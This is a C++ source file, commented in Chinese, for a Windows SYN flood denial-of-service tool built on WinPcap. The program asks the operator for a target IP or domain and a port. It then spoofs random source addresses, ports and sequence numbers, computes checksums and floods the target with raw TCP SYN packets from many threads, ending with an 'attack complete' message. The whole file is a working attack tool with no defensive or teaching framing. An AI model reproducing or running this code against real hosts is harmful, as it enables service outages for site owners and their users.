#include <iostream>
#include <iphlpapi.h>
#include <pcap.h>
#include <string.h>

typedef unsigned char byte;   //一个字节
typedef unsigned short byte2; //两个字节
typedef unsigned int byte4;   //四个字节

//线程参数结构体
struct PACKET_PARAM
{
    pcap_t *iface;     //网卡
    byte *packet;      //数据包
    byte *fake_packet; //计算校验和用的伪包
    byte4 r;           //随机数
    int count;         //攻击次数

} packet_param;

//以太网帧报头 14个字节
struct ETH_HEADER
{
    byte mac_dst[6]; //目的以太网地址
    byte mac_src[6]; //源以太网地址
    byte2 eth_type;  //以太网类型
};

//IP报头 20个字节
struct IP_HEADER
{
    byte header_len : 4, ip_ver : 4;                //版本+IP报文长度
    byte tos;                                       //服务类型(Type of service)
    byte2 total_len;                                //除去eth部分的总长(Total length)
    byte2 identification;                           //标识(Identification)
    byte2 of1 : 5, mf : 1, df : 1, rb : 1, of2 : 8; //标志位(Flags) (3 bits) + 段偏移量(Fragment offset) (13 bits)
    byte ttl;                                       //存活时间(Time to live)
    byte proto;                                     //协议(Protocol)
    byte2 ip_crc;                                   //首部校验和(Header checksum)
    byte4 ip_src;                                   //源地址(Source address)
    byte4 ip_dst;                                   //目的地址(Destination address)
};

//TCP报头 20个字节
struct TCP_HEADER
{
    byte2 port_src;        //源端口
    byte2 port_dst;        //目的端口
    byte4 sequence;        //序列号
    byte4 acknowledgement; //确认号
    //tcp头部长度+标志位
    byte2 nonce : 1, reserved : 3, header_len : 4,
        fin : 1, syn : 1, reset : 1, push : 1, ack : 1, urgent : 1, ecn_echo : 1, cwr : 1;
    byte2 windows_size;   //窗口大小
    byte2 tcp_crc;        //校验和
    byte2 urgent_pointer; //紧急指针
};

//伪IP报头 12个字节
struct FAKE_HEADER
{
    byte4 ip_src;     //源地址(Source address)
    byte4 ip_dst;     //目的地址(Destination address)
    byte padding;     //填充
    byte proto;       //协议(Protocol)
    byte2 header_len; //IP报文长度
};

//校验和计算
byte2 CheckSum(byte2 packet[], int size)
{
    byte4 cksum = 0;
    while (size > 1)
    {
        cksum += *packet++;
        size -= sizeof(byte2);
    }
    if (size)
        cksum += *(byte *)packet;
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (byte2)(~cksum);
}

//通过网关IP，读取ARP表匹配获得网关MAC
int GetGatewayMac(ETH_HEADER *eth_h, char *gatewayip)
{
    unsigned long table_size = 0; //arp信息结构体大小
    PMIB_IPNETTABLE arp_table = NULL;
    //获取arp结构体大小
    unsigned long res = GetIpNetTable(arp_table, &table_size, FALSE);
    if (res == ERROR_INSUFFICIENT_BUFFER)
    {
        //划分内存空间并读取arp信息
        arp_table = (PMIB_IPNETTABLE)malloc(table_size);
        if (NO_ERROR == GetIpNetTable(arp_table, &table_size, FALSE))
        {
            //逐行读取arp信息
            PMIB_IPNETROW cur_arp_log = arp_table->table;
            IN_ADDR gatewayaddr;
            for (int k = 0; k < arp_table->dwNumEntries; ++k)
            {
                //匹配网关IP地址, 设置目标MAC为网关MAC
                gatewayaddr.S_un.S_addr = cur_arp_log[k].dwAddr;
                if (lstrcmp(inet_ntoa(gatewayaddr), gatewayip) == 0)
                    for (int j = 0; j < cur_arp_log[k].dwPhysAddrLen; j++)
                        memcpy(&eth_h->mac_dst[j], &cur_arp_log[k].bPhysAddr[j], 1);
                else
                    continue;
            }
        }
    }
    else
        return -1;
    delete arp_table;
    return 0;
}

//读取所有网卡设备信息，选择发包网卡并获取网卡MAC地址
void ChooseIface(ETH_HEADER *eth_h)
{
    char iface_name[100] = {0};                        //网卡名称
    char errbuf[PCAP_ERRBUF_SIZE];                     //错误缓冲
    PIP_ADAPTER_INFO alldevs = new IP_ADAPTER_INFO();  //网卡信息列表头
    PIP_ADAPTER_INFO dev;                              //当前网卡信息
    unsigned long list_size = sizeof(IP_ADAPTER_INFO); //获取单个结构体大小
    int res = GetAdaptersInfo(alldevs, &list_size);    //读取网卡信息
    int i = 0, j = 0;                                  //计数用
    if (ERROR_BUFFER_OVERFLOW == res)
    {
        //空间不够,删除之前分配的内存,重新分配
        delete alldevs;
        alldevs = (PIP_ADAPTER_INFO) new BYTE[list_size];
        res = GetAdaptersInfo(alldevs, &list_size);
    }
    if (ERROR_SUCCESS == res)
    {
        //输出所有网卡的信息用于选择
        dev = alldevs;
        while (dev)
        {
            printf("No.%d ", ++i);
            printf("%s\n", dev->Description);
            dev = dev->Next;
        }
    }
    else
    {
        printf("获取网卡信息失败\n");
        if (alldevs)
            delete alldevs;
        system("PAUSE");
        exit(-1);
    }
    do
    {
        printf("选择网卡,输入网卡编号 (1-%d): ", i);
        scanf("%d", &j);
        getchar();
    } while (j < 1 || j > i);
    //循环到所选网卡
    for (dev = alldevs, i = 0; i < j - 1; dev = dev->Next, i++)
        ;
    //绑定网卡,参数(网卡名,要捕获的部分,混杂模式,读超时时间,错误缓冲)
    sprintf(iface_name, "\\Device\\NPF_%s", dev->AdapterName);
    if ((packet_param.iface = pcap_open_live(iface_name, 65535, 1, 1000, errbuf)) == NULL)
    {
        fprintf(stderr, "\n无法打开该网络适配器. WinPcap不支持 \n");
        system("PAUSE");
        exit(-1);
    }
    //设置源MAC地址为所选网卡MAC
    for (i = 0; i < dev->AddressLength; i++)
        memcpy(&eth_h->mac_src[i], &dev->Address[i], 1);
    //通过网关IP查询网关MAC地址
    if (GetGatewayMac(eth_h, dev->GatewayList.IpAddress.String) == -1)
    {
        printf("获取网关MAC失败");
        delete alldevs;
        system("PAUSE");
        exit(-1);
    }
    delete alldevs;
    return;
}

//输入攻击目标的IP和端口
void InputDst(IP_HEADER *ip_h, TCP_HEADER *tcp_h, FAKE_HEADER *fake_h)
{
    char dst[20];
    int i = 0, j = 0;
    printf("请输入目标IP或域名: ");
    gets(dst);
    byte4 ip = inet_addr(dst);
    //判断输入的是IP还是域名
    if (ip == INADDR_NONE)
    {
        struct hostent *host;
        host = gethostbyname(dst);
        if (!host)
        {
            puts("获取IP地址失败!");
            system("PAUSE");
            exit(-1);
        }
        //判断该域名是否拥有多个IP
        if (host->h_addr_list[1])
        {
            for (i = 0; host->h_addr_list[i]; i++)
                printf("%d: %s\n", i + 1, inet_ntoa(*(IN_ADDR *)host->h_addr_list[i]));
            do
            {
                printf("该域名有多个IP地址,输入目标IP编号 (1-%d): ", i);
                scanf("%d", &j);
            } while (j < 1 || j > i);
            ip = *(byte4 *)host->h_addr_list[--i];
        }
        else
            ip = *(byte4 *)host->h_addr_list[0];
    }
    //设置目标IP
    ip_h->ip_dst = ip;
    fake_h->ip_dst = ip;
    //设置目标端口
    u_short dst_port;
    printf("请输入目标端口: ");
    scanf("%u", &dst_port);
    tcp_h->port_dst = htons(dst_port);
    return;
}

//构造数据包
void CraftPacket(ETH_HEADER *eth_h, IP_HEADER *ip_h, TCP_HEADER *tcp_h, FAKE_HEADER *fake_h)
{
    //eth层
    // eth_h->mac_dst;
    // eth_h->mac_src;
    eth_h->eth_type = htons(0x0800); //类型

    //ip层
    ip_h->ip_ver = 4;                         //版本
    ip_h->header_len = sizeof(IP_HEADER) / 4; //IP头部长度
    // ip_h->tos = 0;
    ip_h->total_len = htons(sizeof(IP_HEADER) + sizeof(TCP_HEADER)); //IP+TCP头部长度
    // ip_h->identification = 0;
    // ip_h->rb = 0;
    ip_h->df = 1; //不分片
    // ip_h->mf = 0;
    // ip_h->of1 = 0;
    // ip_h->of2 = 0;
    ip_h->ttl = 0xff; //TTL
    ip_h->proto = 6;  //协议TCP
    // ip_h->ip_crc = 0;
    // ip_h->ip_src;
    // ip_h->ip_dst;

    //tcp层
    // tcp_h->port_src = 0;
    // tcp_h->port_src;
    // tcp_h->sequence = 0;
    // tcp_h->acknowledgement = 0;
    tcp_h->header_len = 20 / 4; //TCP头部长度
    // tcp_h->reserved = 0;
    // tcp_h->nonce = 0;
    // tcp_h->cwr = 0;
    // tcp_h->ecn_echo = 0;
    // tcp_h->urgent = 0
    // tcp_h->ack = 0;
    // tcp_h->push = 0;
    // tcp_h->reset = 0;
    tcp_h->syn = 1; //SYN请求包
    // tcp_h->fin = 0;
    tcp_h->windows_size = htons(0xffff); //窗口大小
    // tcp_h->tcp_crc = 0;
    // tcp_h->urgent_pointer = 0;

    //伪ip报头
    // fake_h->ip_src;
    // fake_h->ip_dst;
    // fake_h->padding = 0;
    fake_h->proto = 6;                              //协议(Protocol)
    fake_h->header_len = htons(sizeof(TCP_HEADER)); //IP报文长度
    return;
}

//攻击线程
DWORD WINAPI AttackThread(LPVOID Param)
{
    byte packet[54] = {0};                             //数据包
    byte fake_packet[32] = {0};                        //伪包
    memcpy(packet, packet_param.packet, 54);           //把数据包信息拷贝到线程变量
    memcpy(fake_packet, packet_param.fake_packet, 32); //把伪包信息拷贝到线程变量
    int count = packet_param.count;                    //攻击次数
    packet_param.r += 1;                               //随机数
    byte4 seed = rand() * packet_param.r;              //随机数
    char baseip[20];
    sprintf(baseip, "192.%u.0.0", (byte4)seed % 0xf); //随机用IP
    byte4 ip_s = ntohl(inet_addr(baseip));            //换格式
    byte4 seq;                                        //序号
    byte2 port_s;                                     //源端口

    IP_HEADER *ip_h = (IP_HEADER *)(packet + sizeof(ETH_HEADER));                        //IP头部
    TCP_HEADER *tcp_h = (TCP_HEADER *)(packet + sizeof(ETH_HEADER) + sizeof(IP_HEADER)); //TCP头部
    FAKE_HEADER *fake_h = (FAKE_HEADER *)fake_packet;                                    //伪IP头部
    TCP_HEADER *fake_tcp_h = (TCP_HEADER *)(fake_packet + sizeof(FAKE_HEADER));          //TCP伪头部
    while (count > 0)
    {
        //随机源IP地址
        ip_s += ((seed * count) % 0xffff) + 1;
        (*ip_h).ip_src = htonl(ip_s);
        fake_h->ip_src = htonl(ip_s);
        //随机源端口
        port_s = ((seed * count) % 0xff) + 1024;
        tcp_h->port_src = htons(port_s);
        fake_tcp_h->port_src = htons(port_s);
        //随机序列号
        seq = (seed * count) % 0xffffff;
        tcp_h->sequence = htonl(seq);
        fake_tcp_h->sequence = htonl(seq);
        //重置校验和
        ip_h->ip_crc = 0;
        tcp_h->tcp_crc = 0;
        //求校验和
        ip_h->ip_crc = CheckSum((byte2 *)ip_h, sizeof(IP_HEADER));
        tcp_h->tcp_crc = CheckSum((byte2 *)fake_packet, sizeof(FAKE_HEADER) + sizeof(TCP_HEADER));
        //发包
        if (pcap_sendpacket(packet_param.iface, packet, sizeof(packet)) != 0)
        {
            fprintf(stderr, "\n发包失败: \n", pcap_geterr(packet_param.iface));
            system("PAUSE");
            exit(-1);
        }
        count -= 1;
    }
    return 0;
}

//设置攻击线程数和次数，创建攻击线程
void ReadyAttack(byte4 *dst_ip, byte2 *dst_port)
{
    int i, tc; //计数用
    printf("输入攻击线程数: ");
    scanf("%d", &tc);
    printf("输入每线程攻击次数: ");
    scanf("%d", &packet_param.count);
    printf("开始攻击......\n");
    HANDLE Threads[tc]; //创建线程
    for (i = 0; i < tc; i++)
        Threads[i] = CreateThread(NULL, 0, AttackThread, NULL, 0, NULL);
    WaitForMultipleObjects(tc, Threads, TRUE, INFINITE);
    //都执行完毕后关闭线程
    for (i = 0; i < tc; i++)
        CloseHandle(Threads[i]);
    //输出攻击信息
    printf("攻击目标 -> %s:%u\n攻击线程数->%u\n每个线程攻击次数->%d\n",
           inet_ntoa(*(IN_ADDR *)dst_ip), ntohs(*dst_port), tc, packet_param.count);
    printf("攻击完毕!\n");
}

int main(int argc, char **argv)
{
    system("mode con cols=110 lines=20");   //设置窗口大小
    byte packet[54] = {0};                  //数据包
    byte fake_packet[32] = {0};             //计算校验和用的伪包
    packet_param.packet = packet;           //把数据包的地址存入线程参数结构体
    packet_param.fake_packet = fake_packet; //把伪包的地址存入线程参数结构体

    ETH_HEADER *eth_h = (ETH_HEADER *)packet;                                            //以太网头部
    IP_HEADER *ip_h = (IP_HEADER *)(packet + sizeof(ETH_HEADER));                        //IP头部
    TCP_HEADER *tcp_h = (TCP_HEADER *)(packet + sizeof(ETH_HEADER) + sizeof(IP_HEADER)); //TCP头部
    FAKE_HEADER *fake_h = (FAKE_HEADER *)fake_packet;                                    //伪IP头部

    CraftPacket(eth_h, ip_h, tcp_h, fake_h);                              //创建数据包
    ChooseIface(eth_h);                                                   //选择网卡,设置源MAC和目的MAC
    InputDst(ip_h, tcp_h, fake_h);                                        //输入目标IP和端口
    memcpy(fake_packet + sizeof(FAKE_HEADER), tcp_h, sizeof(TCP_HEADER)); //将TCP头部内容复制到伪包的TCP伪头部
    ReadyAttack(&ip_h->ip_dst, &tcp_h->port_dst);                         //创建攻击线程
    system("PAUSE");
    return 0;
}